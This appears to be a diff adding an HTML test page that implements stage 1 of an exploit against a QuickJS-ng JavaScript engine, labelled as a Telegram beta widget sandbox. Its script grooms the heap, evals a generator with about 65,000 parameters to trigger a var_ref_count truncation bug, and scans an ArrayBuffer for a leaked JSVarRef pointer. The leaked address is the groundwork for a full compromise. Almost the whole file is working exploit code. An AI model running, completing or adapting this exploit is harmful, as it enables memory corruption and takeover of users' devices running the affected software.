@@ -1,0 +1,64 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>1865 leak</title>
+<div id="w">1865 leak: start</div>
+<script>
+/* Telegram 13.2.0 beta widget sandbox - quickjs-ng snapshot [2026-10-08, 2026-10-30)
+ * issue #1865: uint16 var_ref_count truncation.
+ *
+ * DEVICE LEAK TEST (stage 1 of 2).
+ * Groom (bionic/Scudo, top-down mmap): the generator source is eval'ed
+ * FIRST (its 131 KB source + 65k-param bytecode settle), then a 1 MB
+ * ArrayBuffer b0 is allocated, then g() allocates the 1 MB frame BELOW b0.
+ * The body creates the closure f, and get_var_ref(y) OOB-writes a real
+ * JSVarRef* into b0 at frame+~512 KB. We scan b0 and display it.
+ *
+ * Markers:
+ *   S0     = first it.next() is about to run (body + OOB write)
+ *   S1 ... = leaked JSVarRef pointer found in b0 (V=0x..., off=...)
+ *   S1 NOLEAK = ran but no non-zero qword in b0
+ *   ERR ...   = exception text
+ */
+(function () {
+  var W = document.getElementById('w');
+  var LOG = [];
+  function mark(s) {
+    LOG.push(s);
+    function paint() { try { W.textContent = LOG.join(' | '); } catch (e) {} }
+    paint();
+    try { requestAnimationFrame(paint); } catch (e) {}
+  }
+  try {
+    var params = "x,".repeat(65533) + "y";           /* 65,533 x + y */
+    eval("function* g(" + params + "){" +
+         "if (0) eval('');" +                        /* parse-time capture of all args/vars */
+         "var f=()=>y, a=0, b=0, c=0, d=0;" +
+         "yield f;" +
+         "}");
+    var b0 = new ArrayBuffer(1048576);
+    var v0 = new Uint8Array(b0);
+    v0.fill(0);
+    globalThis.b0 = b0; globalThis.v0 = v0;
+    var it = g();                                    /* frame allocated below b0 */
+    globalThis.it = it;
+    mark('S0');
+    var f = it.next().value;                         /* body: get_var_ref OOB write into b0 */
+    globalThis.f = f;
+    var V = 0n, off = -1;
+    for (var i = 0; i < v0.length; i += 8) {
+      var lo = (v0[i] | (v0[i+1] << 8) | (v0[i+2] << 16) | (v0[i+3] << 24)) >>> 0;
+      var hi = (v0[i+4] | (v0[i+5] << 8) | (v0[i+6] << 16) | (v0[i+7] << 24)) >>> 0;
+      if (lo || hi) {
+        V = BigInt(hi) * 4294967296n + BigInt(lo);
+        off = i;
+        break;
+      }
+    }
+    if (V === 0n) { mark('S1 NOLEAK'); return; }
+    globalThis.V = V;
+    mark('S1 V=0x' + V.toString(16) + ' off=' + off);
+  } catch (e) {
+    mark('ERR ' + (e && e.message ? e.message : String(e)));
+  }
+})();
+</script>
